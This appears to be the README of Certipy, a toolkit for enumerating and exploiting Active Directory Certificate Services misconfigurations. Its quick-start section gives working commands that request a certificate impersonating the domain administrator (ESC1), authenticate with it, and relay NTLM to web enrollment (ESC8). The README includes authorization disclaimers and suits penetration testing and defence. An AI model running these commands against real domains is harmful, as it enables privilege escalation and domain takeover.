# Certipy - AD CS Attack & Enumeration Toolkit

[![PyPI version](https://badge.fury.io/py/certipy-ad.svg)](https://badge.fury.io/py/certipy-ad)
![Python](https://img.shields.io/badge/python-3.12+-blue.svg)
![License](https://img.shields.io/github/license/ly4k/Certipy)

**Certipy** is a powerful offensive and defensive toolkit for enumerating and abusing Active Directory Certificate Services (AD CS). It helps red teamers, penetration testers, and defenders assess AD CS misconfigurations — including full support for identifying and exploiting all known **ESC1–ESC15** attack paths (excluding ESC5).

> [!WARNING]
> Use only in environments where you have explicit authorization. Unauthorized use may be illegal.

---

## 🔍 Features

- 🔎 Discover Enterprise Certificate Authorities and Templates
- 🚩 Identify misconfigurations (e.g., ESC1–ESC15)
- 🔐 Request and forge certificates
- 🎭 Perform authentication using certificates (PKINIT/Schannel)
- 📡 Relay NTLM authentication to AD CS HTTP/RPC endpoints
- 🧪 Support for Shadow Credentials, Golden Certificates, and Certificate Mapping Attacks

---

## 📚 Full Wiki & Documentation

Read the full **step-by-step usage guide**, including installation, vulnerability explanations, examples, and mitigations in the [📘 Certipy Wiki](https://github.com/ly4k/Certipy/wiki).

---

## ⚙️ Installation

Certipy supports **Python 3.12+** on both **Linux** and **Windows**. Linux is the primary supported platform, but core functionality works on Windows as well.

> [!TIP]
> **For Kali Linux Users**  
> Certipy is pre-installed in Kali under the command name `certipy-ad`.  
> The Kali package is **not maintained by the original author** and may **lag behind the latest version**.  
> For the latest features and fixes, install from PyPI manually using `pip`.

### 🐧 Linux (Debian/Ubuntu/Kali)

```bash
sudo apt update && sudo apt install -y python3 python3-venv python3-pip
python3 -m venv ~/certipy-env
source ~/certipy-env/bin/activate
pip install --upgrade pip
pip install certipy-ad
````

### 🪟 Windows (PowerShell)

```powershell
python -m venv certipy-env
certipy-env\Scripts\Activate.ps1
pip install --upgrade pip
pip install certipy-ad
```

Verify installation:

```bash
certipy -h
```

---

## 🚀 Quick Start

### Enumerate CAs and Templates

```bash
certipy find -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100
```

### Request a Certificate for Another User (ESC1-style)

```bash
certipy req -u 'user@domain.local' -p 'Passw0rd!' \
  -ca 'CORP-CA' -target 'CA.CORP.LOCAL' \
  -template 'ESC1' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-2328196741-663698128-2762965104-500' \
  -dc-ip 10.0.0.100
```

### Authenticate with a Certificate

```bash
certipy auth -pfx ./administrator.pfx -dc-ip 10.0.0.100
```

### NTLM Relay to AD CS Web Enrollment (ESC8)

```bash
certipy relay -ca http://ca.corp.local -template DomainController
```

---

## ✅ Supported ESC Vulnerabilities

Certipy provides comprehensive support for detecting and exploiting AD CS vulnerabilities **ESC1 – ESC15** (excluding ESC5)

For detailed explanations, exploitation steps, and mitigation strategies, refer to the [Certipy Wiki](https://github.com/ly4k/Certipy/wiki).

---

## 📎 Related Tools & References

* 📘 [Certified Pre-Owned – SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
* 🔭 [BloodHound PKI Attack Paths](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf)
* 🛡️ [Microsoft AD CS Hardening Guide](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-prevent-users-request-certificate)

---

## 🛡️ Disclaimer

This tool is designed exclusively for use in **authorized penetration testing**, **red teaming**, **security assessments**, and **security research**. **Do not use** in environments where you do not have **explicit written permission**. Unauthorized use may violate laws and ethical standards.

---

## 🤝 Contributing

Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on reporting issues, improving documentation, or submitting pull requests.

---

## 🌟 Sponsors

Thanks to these generous sponsors for supporting the development of this project. Your contributions help sustain ongoing work and improvements.

<!-- sponsors --><a href="https://github.com/fgeek"><img src="https:&#x2F;&#x2F;github.com&#x2F;fgeek.png" width="60px" alt="User avatar: Henri Salo" /></a><a href="https://github.com/mxrch"><img src="https:&#x2F;&#x2F;github.com&#x2F;mxrch.png" width="60px" alt="User avatar: mxrch" /></a><!-- sponsors -->

---

## 👤 Author

Developed by [@ly4k](https://github.com/ly4k)
Contributions welcome via pull requests or issues.

---

## 📘 Wiki

📖 Visit the [**Certipy Wiki**](https://github.com/ly4k/Certipy/wiki) for detailed documentation, usage examples, ESC vulnerability breakdowns, and mitigation advice.
